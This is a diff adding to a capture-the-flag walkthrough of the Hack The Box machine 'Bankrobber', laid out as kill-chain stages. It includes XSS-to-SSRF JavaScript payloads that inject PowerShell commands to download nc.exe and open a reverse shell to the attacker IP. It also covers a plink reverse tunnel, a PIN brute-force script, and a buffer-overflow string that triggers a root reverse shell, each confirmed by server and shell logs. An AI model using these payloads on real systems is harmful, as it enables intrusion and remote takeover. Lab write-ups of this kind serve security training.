@@ -376,17 +376,19 @@ This is due to the recent hack attempts on our server.`
 
 I tried a bunch of Curl post request spoofing the headers to make it look like the packet was coming from localhost but no cigar.
 
+### Weaponization/Delivery/Exploitation/Installation:
+**XSS->SSRF->RCE**
+
 After taken a short break, I then observed that since maybe we can't manipulate the backdoorchecker field from our host. Why not just go back to the XSS we found in the coin transfer and do SSRF to get a RCE. In-fucking-deed! 
 
 let's weaponize this mothafucker.
 
-### Weaponization/Delivery/Exploitation/Installation: XSS->SSRF->RCE
 
 XSS To drop nc.exe:
-`<script src=http://10.10.14.5/payd.js%3E</script>`
+`<script src=http://10.10.14.40/payd.js%3E</script>`
 
 XSS to Reverse Shell:
-`<script src=http://10.10.14.5/pay.js%3E</script>`
+`<script src=http://10.10.14.40/pay.js%3E</script>`
 
 `payd.js`
 ```
@@ -394,7 +396,7 @@ XSS to Reverse Shell:
 function paintfunc(){
     var http = new XMLHttpRequest();
         var url = 'http://localhost/admin/backdoorchecker.php';
-        var params = 'cmd=dir | powershell -c Invoke-WebRequest -Uri "http://10.10.14.5/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"';
+        var params = 'cmd=dir | powershell -c Invoke-WebRequest -Uri "http://10.10.14.40/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"';
         http.open('POST', url, true);
         http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
         http.send(params);
@@ -408,7 +410,7 @@ paintfunc();
 function paintfunc(){
     var http = new XMLHttpRequest();
         var url = 'http://localhost/admin/backdoorchecker.php';
-        var params = 'cmd=dir | powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.14.5 4444';
+        var params = 'cmd=dir | powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.14.40 4444';
         http.open('POST', url, true);
         http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
         http.send(params);
@@ -416,9 +418,132 @@ function paintfunc(){
 
 paintfunc();
 ```
+delivered our payload and confirmation of our drop.
+```
+┌─[account@parrot]─[~/tmp]
+└──╼ $sudo python -m http.server 80
+[sudo] password for account: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.14.40 - - [21/Mar/2020 05:34:52] "GET / HTTP/1.1" 200 -
+10.10.10.154 - - [21/Mar/2020 05:37:54] "GET /payd.js HTTP/1.1" 200 -
+10.10.10.154 - - [21/Mar/2020 05:37:55] "GET /nc.exe HTTP/1.1" 200 -
+```
+Initalize a netcat tcp socket to listen for our reverse shell.
+`nc -lvp 4444`
+Start my webserver for SSRF
+```
+┌─[account@parrot]─[~/tmp]
+└──╼ $sudo python -m http.server 80
+[sudo] password for account: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [21/Mar/2020 05:37:54] "GET /payd.js HTTP/1.1" 200 -
+10.10.10.154 - - [21/Mar/2020 05:37:55] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.154 - - [21/Mar/2020 06:01:54] "GET /pay.js HTTP/1.1" 200 -
+```
+After sending our XSS payload and waiting. We eventually get our user shell.
+```
+┌─[account@parrot]─[~/tmp]
+└──╼ $nc -lvp 4444
+listening on [any] 4444 ...
+10.10.10.154: inverse host lookup failed: Unknown host
+connect to [10.10.14.40] from (UNKNOWN) [10.10.10.154] 51129
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
+
+C:\xampp\htdocs\admin>whoami
+whoami
+bankrobber\cortin
+```
+Now we can being enumerating the OS and begin enumerating services/proccesses/files for a privledge esculation.
+
+Interesting we found a bankv2.exe binary in the root directory file.
+
+```
+C:\xampp\htdocs\admin>netstat -a
+netstat -a
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:80             Bankrobber:0           LISTENING
+  TCP    0.0.0.0:135            Bankrobber:0           LISTENING
+  TCP    0.0.0.0:443            Bankrobber:0           LISTENING
+  TCP    0.0.0.0:445            Bankrobber:0           LISTENING
+  TCP    0.0.0.0:910            Bankrobber:0           LISTENING
+  TCP    0.0.0.0:3306           Bankrobber:0           LISTENING
+```
+We can also see a unorthodox service on 910.
+
+So I droped another tool on the system `plink.exe` a much more evasive means to remain silent while forwarding a port.
 
 ### Command and Control
-The intruder gains persistent access to the victimâ€™s systems/network
+
+
+So I droped another tool on the system `plink.exe` a much more evasive means to remain silent while forwarding a port through a reverse tunnel.
+
+Run `powershell.exe` and Invoke a request to get plink.
+```
+Invoke-WebRequest -Uri "http://10.10.14.40/plink.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\plink.exe"
+```
+our C2:
+```
+10.10.10.154 - - [21/Mar/2020 06:33:52] "GET /plink.exe HTTP/1.1" 200 -
+```
+Fire up plink and foreward the port onto the C2 through a reverse ssh tunnel so make sure you have `ssh service start` running.
+```
+#.\plink.exe -P 22 -l account -N -C -R 4000:127.0.0.1:910 10.10.14.40
+```
+so now we can see that this is a internal bank service that prompts us for a pin.
+```
+┌─[account@parrot]─[~/tmp]
+└──╼ $nc localhost 4000
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$] 
+
+```
+Started to look for memory corruption vulnerabilites like a BoF but nothing, so I write a quick BF script in python.
+
+```python
+from itertools import product
+
+chars = '0123456789' # chars to look for
+
+for length in range(1, 3): # only do lengths of 1 + 2
+    to_attempt = product(chars, repeat=length)
+    for attempt in to_attempt:
+        print(''.join(attempt))
+```
+
+and it instantly returns a success at `0021`
+
+```
+Please enter your super secret 4 digit PIN code to login:
+ [$] 0021
+ [$] PIN is correct, access granted!
+ --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+ [$] .........
+ [!] You waited too long, disconnecting client....
+```
+It timed out if I wait too long. 
+I began to add more and more char to the input until I notice that the output starts to become overwritten.
+
+Now we know there is a BoF.
+
+You have to be careful here because you can easily crash the service and have to start again from stage one as I've done this once.
+
+I finally craft a payload that enables me to overwrite the area in memory where `transfer.exe` is called and execute a system command that will give us our `root` reverse bind shell.
+
+```
+#dgdasgadsghsdkjghsdjhgfsadhgsadhC:\windows\system32\spool\drivers\color\nc.exe 10.10.14.40 6962 -e cmd.exe
+```
+
+
 
 ### Actions on Objective
-Intruder initiates end goal actions, such as data theft, data corruption, or data destruction
+Flags exfiltrated.
